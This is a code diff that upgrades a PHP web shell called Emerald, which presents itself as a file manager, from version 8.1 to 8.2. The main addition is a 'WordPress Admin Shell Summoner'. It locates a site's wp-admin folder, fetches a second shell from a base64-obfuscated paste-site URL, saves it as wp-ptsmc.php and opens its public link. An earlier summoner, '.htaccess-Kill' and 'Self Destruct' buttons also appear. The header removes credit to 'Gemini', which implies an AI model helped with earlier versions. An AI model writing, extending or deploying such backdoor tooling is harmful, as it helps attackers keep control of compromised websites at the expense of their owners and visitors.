@@ -1,9 +1,11 @@
 <?php
 /**
- * Emerald v8.1 - A PTSMC GROUP Project (Major Upgrade by Gemini)
- * @version 8.1 (Fix Change Time, Mass Rename, Recursive Content Search, Shell Summoner & More)
- * @author PTSMC Group (Optimized by Leo, feature by jnx, Design by lpe, Upgraded by Gemini)
+ * Emerald v8.2 - A PTSMC GROUP Project
+ * @version 8.2 (WordPress Admin Shell Summoner, Fix Change Time, Mass Rename, Recursive Content Search, Shell Summoner & More)
+ * @author PTSMC Group (Optimized by Leo, feature by jnx, Design by lpe)
  * @description A powerful, single-file PHP file manager with a comprehensive suite of tools for developers and administrators.
+ * @changelog v8.2:
+ * - NEW FEATURE: WordPress Admin Shell Summoner - Downloads a shell script to the /wp-admin/ directory and opens the access link.
  * @changelog v8.1:
  * - NEW FEATURE: PHP Shell Summoner (ptsmc.php) - Downloads a shell script from a predefined URL and saves it as 'ptsmc.php'.
  * - NEW FEATURE: Mass Rename (Selection Toolbar) - Allows replacing a string in the names of multiple selected files/folders.
@@ -13,7 +15,7 @@
  * - MODIFIED: Default theme set to Light Mode.
  * - MODIFIED: System Status removed from UI, but core functions retained.
  * - CORE: All features from v8.0 are fully maintained. This is a pure feature and performance upgrade with no regressions.
- * - VERSION: Incremented to v8.1 to reflect significant new features and enhancements.
+ * - VERSION: Incremented to v8.2 to reflect significant new features and enhancements.
  */
 
 // --- Initialization & Configuration ---
@@ -178,6 +180,85 @@ function fetch_and_save_shell($url, $dir, $filename) {
 }
 
 /**
+ * [NEW v8.2] Finds the path to the wp-admin directory in a WordPress installation.
+ * @param string $start_dir The starting directory.
+ * @param int $max_depth The maximum search depth upwards.
+ * @return string|null The realpath of the wp-admin directory, or null if not found.
+ */
+function find_wp_admin_path($start_dir, $max_depth = 10) {
+    $current_dir = realpath($start_dir);
+    for ($i = 0; $i < $max_depth; $i++) {
+        if (!$current_dir || $current_dir === '/' || $current_dir === '.' || empty($current_dir)) break;
+
+        // Check if this directory is the WP root
+        if (file_exists($current_dir . DIRECTORY_SEPARATOR . 'wp-load.php') && is_dir($current_dir . DIRECTORY_SEPARATOR . 'wp-admin')) {
+            return $current_dir . DIRECTORY_SEPARATOR . 'wp-admin';
+        }
+
+        // Move up one level
+        $current_dir = dirname($current_dir);
+    }
+    return null;
+}
+
+/**
+ * [NEW v8.2] Fetches content from a URL and saves it as wp-ptsmc.php in the wp-admin directory.
+ * @param string $url The URL to fetch the content from.
+ * @param string $start_dir The starting directory for the search.
+ * @param string $filename The filename to save (e.g., wp-ptsmc.php).
+ * @return array
+ */
+function fetch_and_save_wp_ptsmc($url, $start_dir, $filename) {
+    if (!filter_var($url, FILTER_VALIDATE_URL)) {
+        return ['status' => 'error', 'message' => 'Invalid URL provided.'];
+    }
+    
+    $wp_admin_dir = find_wp_admin_path($start_dir);
+    if (is_null($wp_admin_dir)) {
+        return ['status' => 'error', 'message' => 'WordPress wp-admin directory not found. Please navigate closer to the installation.'];
+    }
+
+    $content = @file_get_contents($url);
+    if ($content === false) {
+        if (function_exists('curl_init')) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+            $content = curl_exec($ch);
+            curl_close($ch);
+        }
+    }
+
+    if ($content === false || empty($content)) {
+        return ['status' => 'error', 'message' => "Failed to fetch content from URL: " . htmlspecialchars($url)];
+    }
+
+    $save_path = $wp_admin_dir . DIRECTORY_SEPARATOR . $filename;
+    
+    if (file_exists($save_path)) {
+        return ['status' => 'error', 'message' => "File '{$filename}' already exists in wp-admin. Please delete or rename the existing file first."];
+    }
+
+    if (@file_put_contents($save_path, $content) !== false) {
+        @chmod($save_path, octdec('0644'));
+        
+        // Construct the public URL
+        $doc_root = realpath($_SERVER['DOCUMENT_ROOT']);
+        $url_akses = null;
+        if ($doc_root && strpos($save_path, $doc_root) === 0) {
+            $relative_path = str_replace(DIRECTORY_SEPARATOR, '/', substr($save_path, strlen($doc_root)));
+            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
+            $url_akses = $protocol . '://' . $_SERVER['HTTP_HOST'] . $relative_path;
+        }
+
+        return ['status' => 'success', 'message' => "File '{$filename}' created successfully in wp-admin.", 'url_akses' => $url_akses];
+    } else {
+        return ['status' => 'error', 'message' => "Failed to save file '{$filename}'. Check directory permissions in wp-admin."];
+    }
+}
+
+/**
  * [NEW v8.1] Recursively searches for text within the content of all files in a directory and its subdirectories.
  * @param string $dirPath The starting directory.
  * @param string $query The text to search for.
@@ -330,6 +411,12 @@ if (isset($_POST['action'])) {
             case 'summon_ptsmc':
                 $url_shell = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2xlbnVtaWNhcHRzbWMvcHRzbWMtZ3JvdXAvcmVmcy9oZWFkcy9tYWluL3B0c21jLnBocA==');
                 $response = fetch_and_save_shell($url_shell, $dir, 'ptsmc.php');
+                break;
+                
+            // [NEW FEATURE v8.2] WordPress Shell Summoner Logic
+            case 'summon_wp_ptsmc':
+                $url_shell = base64_decode('aHR0cHM6Ly9va2VwYXN0ZS5jYy9yLzEyNGVkYWI0');
+                $response = fetch_and_save_wp_ptsmc($url_shell, $dir, 'wp-ptsmc.php');
                 break;
                 
             // [NEW FEATURE] HTACCESS Fetcher Logic
@@ -670,7 +757,7 @@ $server_info = [
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Emerald v8.1</title>
+    <title>Emerald v8.2</title>
     <link rel="icon" href="https://i.postimg.cc/90F3Y2YH/ptsmc.png">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">
@@ -1045,7 +1132,7 @@ $server_info = [
     <aside class="sidebar">
         <div class="sidebar-header">
             <h1>Emerald</h1>
-            <div class="subtitle">v8.1 | PTSMC GROUP</div>
+            <div class="subtitle">v8.2 | PTSMC GROUP</div>
         </div>
         
         <div class="sidebar-section">
@@ -1091,10 +1178,13 @@ $server_info = [
                 <input type="file" id="upload-input-hidden" multiple style="display:none;">
                 <button class="action-btn icon-only" onclick="handleRandomPath()" title="Random Path (Random)"><i data-feather="shuffle"></i></button>
                 <button class="action-btn icon-only" onclick="openModal('searchModal')" title="Recursive Search"><i data-feather="search"></i></button>
-                <button class="action-btn icon-only" onclick="openModal('contentSearchModal')" title="Content Search (Recursive)"><i data-feather="file-text"></i></button> <button class="action-btn icon-only" onclick="openModal('linkToFileModal')" title="Link to File"><i data-feather="link"></i></button>
+                <button class="action-btn icon-only" onclick="openModal('contentSearchModal')" title="Content Search (Recursive)"><i data-feather="file-text"></i></button> 
+                <button class="action-btn icon-only" onclick="openModal('linkToFileModal')" title="Link to File"><i data-feather="link"></i></button>
                 <button class="action-btn icon-only" onclick="handleFetchHtb()" title="Fetch .htaccess-Backup"><i data-feather="terminal"></i></button>
                 <button class="action-btn icon-only" onclick="handleFetchHtd()" title="Fetch .htaccess-Kill"><i data-feather="shield-off"></i></button>
-                <button class="action-btn icon-only" onclick="handleSummonPtsmc()" title="PTSMC Shell Summoner"><i data-feather="zap"></i></button> <button class="action-btn icon-only" onclick="openModal('wpCacheModal')" title="WordPress Cache Flusher"><i data-feather="wind"></i></button>
+                <button class="action-btn icon-only" onclick="handleSummonPtsmc()" title="PTSMC Shell Summoner"><i data-feather="zap"></i></button>
+                <button class="action-btn icon-only" onclick="handleSummonWpPtsmc()" title="WordPress Admin Shell Summoner"><i data-feather="zap"></i><i data-feather="lock" style="width:12px; height:12px; margin-left:-8px;"></i></button>
+                <button class="action-btn icon-only" onclick="openModal('wpCacheModal')" title="WordPress Cache Flusher"><i data-feather="wind"></i></button>
                 <button class="action-btn icon-only" onclick="openModal('serverHubModal')" title="Server Hub"><i data-feather="server"></i></button>
                 <button class="action-btn icon-only" onclick="openModal('aboutModal')" title="About"><i data-feather="help-circle"></i></button>
                 <button class="action-btn icon-only" id="self-destruct-btn" title="Self Destruct" style="color: var(--danger-color);"><i data-feather="trash-2"></i></button>
@@ -1218,7 +1308,7 @@ $server_info = [
     <div id="detailsModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title" id="details-title">Properties</h3><button class="modal-close" onclick="closeModal('detailsModal')">&times;</button></div><div class="modal-body"><table id="details-table"><tbody></tbody></table></div><div class="modal-actions"><button type="button" id="details-copy-path" class="btn-primary">Copy Path</button></div></div></div>
     <div id="image-viewer" class="modal"><div class="modal-content"><img id="preview-image" src=""><button id="image-prev" class="image-nav"><i data-feather="chevron-left"></i></button><button id="image-next" class="image-nav"><i data-feather="chevron-right"></i></button><button class="modal-close image-nav" id="image-viewer-close">&times;</button></div></div>
     <div id="uploadModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Upload Progress</h3><button class="modal-close" onclick="closeModal('uploadModal')">&times;</button></div><div class="modal-body"><ul id="upload-progress-list"></ul></div></div></div>
-    <div id="aboutModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">About Emerald</h3><button class="modal-close" onclick="closeModal('aboutModal')">&times;</button></div><div class="modal-body" style="text-align:center;"><p>This script was created and developed by <strong>PTSMC GROUP</strong>, with a total visual and functional transformation by <strong>Lennumica</strong>. This version introduces a fully AJAX-powered interface, new features, and a smoother UX for a seamless, desktop-like experience.</p><p class="version" style="font-size:12px;opacity:0.7;margin-top:20px;">Version 8.1 (Fix Change Time, Mass Rename & More) | @ljxinhere</p></div></div></div>
+    <div id="aboutModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">About Emerald</h3><button class="modal-close" onclick="closeModal('aboutModal')">&times;</button></div><div class="modal-body" style="text-align:center;"><p>This script was created and developed by <strong>PTSMC GROUP</strong>, with a total visual and functional transformation by <strong>Lennumica</strong>. This version introduces a fully AJAX-powered interface, new features, and a smoother UX for a seamless, desktop-like experience.</p><p class="version" style="font-size:12px;opacity:0.7;margin-top:20px;">Version 8.2 (WordPress Admin Shell Summoner, Fix Change Time, Mass Rename & More) | @ljxinhere</p></div></div></div>
     <div id="grepModal" class="modal"><div class="modal-content modal-lg"><div class="modal-header"><h3 class="modal-title">Grep (Find text in current folder)</h3><button class="modal-close" onclick="closeModal('grepModal')">&times;</button></div><div class="modal-body"><form id="grep-form" class="modal-form"><div class="form-group"><label for="grep-query">Text to find</label><input type="text" id="grep-query" required></div><div class="form-group"><label for="grep-pattern">File pattern (e.g., *.php, *.txt)</label><input type="text" id="grep-pattern" value="*"></div><div class="modal-actions"><button type="submit" class="btn-primary">Search</button></div></form><div id="grep-results"></div></div></div></div>
     <div id="contentSearchModal" class="modal"><div class="modal-content modal-lg"><div class="modal-header"><h3 class="modal-title">Recursive Content Search</h3><button class="modal-close" onclick="closeModal('contentSearchModal')">&times;</button></div><div class="modal-body"><form id="content-search-form" class="modal-form"><div class="form-group"><label for="content-search-query">Text to find (Recursive)</label><input type="search" id="content-search-query" required></div><div class="modal-actions"><button type="submit" class="btn-primary">Search</button></div></form><div id="content-search-results"></div></div></div></div> <div id="linkToFileModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Convert Link to File</h3><button class="modal-close" onclick="closeModal('linkToFileModal')">&times;</button></div><div class="modal-body"><form id="link-to-file-form" class="modal-form"><div class="form-group"><label for="link-url">URL</label><input type="url" id="link-url" name="url" required placeholder="https://example.com/page.html"></div><div class="form-group"><label for="link-filename">Save as (filename)</label><input type="text" id="link-filename" name="filename" required></div><div class="form-group"><label for="link-ext">File Type</label><select id="link-ext" name="ext"><option value="html">HTML</option><option value="txt">TXT</option><option value="php">PHP</option></select></div><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('linkToFileModal')">Cancel</button><button type="submit" class="btn-submit">Save</button></div></form></div></div></div>
 
@@ -2396,7 +2486,7 @@ $server_info = [
         }
     }
     
-    // --- New v7.0/v8.0/v8.1 Functions ---
+    // --- New v7.0/v8.0/v8.1/v8.2 Functions ---
     async function handleWpCacheFlush() {
         const statusEl = document.getElementById('wp-cache-status');
         statusEl.style.display = 'block';
@@ -2434,6 +2524,28 @@ $server_info = [
             'This will download the PTSMC Shell script and save it as ptsmc.php in the current directory (0644 perms). Continue?',
             () => {
                 performSimpleAction('summon_ptsmc', {}, true);
+            }
+        );
+    }
+    
+    // [NEW FEATURE v8.2] WordPress Shell Summoner Handler
+    function handleSummonWpPtsmc() {
+        showConfirmModal(
+            'Summon wp-ptsmc.php Shell',
+            'This will download a shell script to the /wp-admin/ directory and set permissions to 0644. Upon success, the access link will open in a new tab. Continue?',
+            async () => {
+                const result = await performSimpleAction('summon_wp_ptsmc', {}, false);
+                if (result.status === 'success') {
+                    showToast(result.message, 'success');
+                    if (result.url_akses) {
+                        window.open(result.url_akses, '_blank');
+                    } else {
+                        showToast("File created, but failed to determine the public URL. Access it manually.", 'warning');
+                    }
+                    setTimeout(() => window.location.reload(), 500);
+                } else {
+                    showToast(result.message || 'Failed to summon wp-ptsmc.php.', 'error');
+                }
             }
         );
     }
